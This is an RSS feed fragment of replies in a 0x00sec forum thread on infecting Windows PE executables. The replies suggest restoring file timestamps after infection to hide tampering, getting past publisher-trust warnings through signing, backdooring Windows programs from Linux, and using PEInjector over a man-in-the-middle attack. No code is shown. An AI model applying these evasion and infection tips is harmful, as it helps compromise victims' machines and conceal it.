+<p>As to changing file modification dates, it will be easy to do. You can do it with powershell or python.</p>
+          <p><a href="https://0x00sec.org/t/pe-file-infection/401/19">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/pe-file-infection/401/19</link>
+        <pubDate>Fri, 10 Feb 2017 10:57:12 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-401-19</guid>
+        <source url="https://0x00sec.org/t/pe-file-infection/401.rss">PE File Infection</source>
+      </item>
+      <item>
+        <title>PE File Infection</title>
+        <dc:creator><![CDATA[dtm]]></dc:creator>
+        <description><![CDATA[
+            <p>Yeah, I guess. If you’re infecting an executable by adding extra data, of course the resulting binary’s signature will be compromised. If you want to sign an executable without the warning message, you’ll need to acquire a certificate from a trusted authority like Verisign, or perhaps you can check out <a href="https://msdn.microsoft.com/en-us/library/aa387764.aspx">Microsoft’s SignTool</a>.</p>
+          <p><a href="https://0x00sec.org/t/pe-file-infection/401/18">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/pe-file-infection/401/18</link>
+        <pubDate>Fri, 10 Feb 2017 10:55:11 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-401-18</guid>
+        <source url="https://0x00sec.org/t/pe-file-infection/401.rss">PE File Infection</source>
+      </item>
+      <item>
+        <title>PE File Infection</title>
+        <dc:creator><![CDATA[pry0cc]]></dc:creator>
+        <description><![CDATA[
+            <p>Oh sweet. Is that just simple metadata modification? Also, would that affect the signature? I would like to find a way to sign executables so as to remove the “this publisher isn’t trusted” message.</p>
+          <p><a href="https://0x00sec.org/t/pe-file-infection/401/17">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/pe-file-infection/401/17</link>
+        <pubDate>Fri, 10 Feb 2017 10:12:41 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-401-17</guid>
+        <source url="https://0x00sec.org/t/pe-file-infection/401.rss">PE File Infection</source>
+      </item>
+      <item>
+        <title>PE File Infection</title>
+        <dc:creator><![CDATA[dtm]]></dc:creator>
+        <description><![CDATA[
+            <p>If you’re going to do that, I’d suggest you add in something that stores the initial file’s dates before modifications and then reapplying it to the file after you infect it.</p>
+          <p><a href="https://0x00sec.org/t/pe-file-infection/401/16">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/pe-file-infection/401/16</link>
+        <pubDate>Fri, 10 Feb 2017 09:46:24 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-401-16</guid>
+        <source url="https://0x00sec.org/t/pe-file-infection/401.rss">PE File Infection</source>
+      </item>
+      <item>
+        <title>PE File Infection</title>
+        <dc:creator><![CDATA[pry0cc]]></dc:creator>
+        <description><![CDATA[
+            <p>I am going to try this in wine with STELF… Wish me luck.</p>
+          <p><a href="https://0x00sec.org/t/pe-file-infection/401/15">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/pe-file-infection/401/15</link>
+        <pubDate>Fri, 10 Feb 2017 09:21:42 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-401-15</guid>
+        <source url="https://0x00sec.org/t/pe-file-infection/401.rss">PE File Infection</source>
+      </item>
+      <item>
+        <title>PE File Infection</title>
+        <dc:creator><![CDATA[Ninja243]]></dc:creator>
+        <description><![CDATA[
+            <p>Epic tutorial!</p>
+<p>This post got me thinking if one could do this in Python, so one thing led to another, I dropped the idea and found PEInjector that seems to do the same thing while performing an MITM attack, so you wouldn’t need to use Social Engineering to get the application on the target’s computer <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
+          <p><a href="https://0x00sec.org/t/pe-file-infection/401/14">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/pe-file-infection/401/14</link>
+        <pubDate>Tue, 31 May 2016 13:25:22 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-401-14</guid>
+        <source url="https://0x00sec.org/t/pe-file-infection/401.rss">PE File Infection</source>
+      </item>
+      <item>
+        <title>PE File Infection</title>
+        <dc:creator><![CDATA[random-man]]></dc:creator>
+        <description><![CDATA[
+            <p>Cool. Thanks DTM. I just learned how to inject code into a PE with Ollydbg, but I’ve been having trouble automating the process with WINAPI. This helps me understand a lot more.</p>
+          <p><a href="https://0x00sec.org/t/pe-file-infection/401/13">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/pe-file-infection/401/13</link>
+        <pubDate>Tue, 24 May 2016 07:45:47 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-401-13</guid>
+        <source url="https://0x00sec.org/t/pe-file-infection/401.rss">PE File Infection</source>
+      </item>
+      <item>
+        <title>PE File Infection</title>
+        <dc:creator><![CDATA[0x00pf]]></dc:creator>
+        <description><![CDATA[
+            <aside class="quote group-VIP" data-username="pry0cc" data-post="11" data-topic="401">
+<div class="title">
+<div class="quote-controls"></div>
+<img alt="" width="20" height="20" src="https://0x00sec.org/user_avatar/0x00sec.org/pry0cc/40/6_2.png" class="avatar"> pry0cc:</div>
+<blockquote>
+<p>I was talking more about backdooring windows applications, using Linux.</p>
+</blockquote>
+</aside>
+<p>That is indeed possible, at the end you are just reading/writing and moving around bytes in a file. I went quickly through <a class="mention" href="https://0x00sec.org/u/dtm">@dtm</a> code and I haven’t see any specific Windows code, except the types definitions… But I may have olverlooked something.</p>
+          <p><a href="https://0x00sec.org/t/pe-file-infection/401/12">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/pe-file-infection/401/12</link>
+        <pubDate>Fri, 20 May 2016 05:10:39 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-401-12</guid>
+        <source url="https://0x00sec.org/t/pe-file-infection/401.rss">PE File Infection</source>
+      </item>
+  </channel>
+</rss>
